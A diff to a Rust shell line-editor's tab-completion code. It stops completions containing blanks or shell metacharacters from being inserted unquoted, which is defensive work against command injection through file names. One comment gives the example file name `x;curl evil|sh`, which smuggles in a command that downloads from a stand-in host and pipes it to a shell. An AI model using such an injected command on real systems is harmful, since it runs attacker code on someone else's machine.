@@ -426,7 +426,9 @@ pub const MAX_DIR_ENTRIES: usize = 4096;
 /// quotes or backslashes get none (their shell meaning differs from the
 /// text), nor do hidden names unless the word starts them with `.`, nor
 /// paths in a directory of more than [`MAX_DIR_ENTRIES`] entries (the
-/// matches past the cap are unknown).
+/// matches past the cap are unknown). An extension with a blank or a
+/// character special to the shell (`;|&()<>$`\"'*?[]{}!#~^=`) is not
+/// offered: it is inserted as typed text, unquoted.
 pub fn complete_word(
     buffer: &str,
     cwd: Option<&str>,
@@ -520,7 +522,42 @@ fn common_extension<'a>(
     if slash {
         extension.push('/');
     }
-    (!extension.is_empty() && !extension.chars().any(char::is_control)).then_some(extension)
+    (!extension.is_empty() && !extension.chars().any(shell_special)).then_some(extension)
+}
+
+/// Whether `c` means something to the shell (or the terminal) when typed
+/// unquoted: a completion containing one is not offered, since inserting
+/// it as text would split the word or run something else (`my file`,
+/// `x;curl evil|sh`). Quoting it instead would have to match the
+/// buffer's own quoting, so no completion is the simple, safe choice.
+fn shell_special(c: char) -> bool {
+    c.is_whitespace()
+        || c.is_control()
+        || matches!(
+            c,
+            ';' | '|'
+                | '&'
+                | '('
+                | ')'
+                | '<'
+                | '>'
+                | '$'
+                | '`'
+                | '\\'
+                | '"'
+                | '\''
+                | '*'
+                | '?'
+                | '['
+                | ']'
+                | '{'
+                | '}'
+                | '!'
+                | '#'
+                | '~'
+                | '^'
+                | '='
+        )
 }
 
 /// Most directory entries read across all of `PATH` when listing
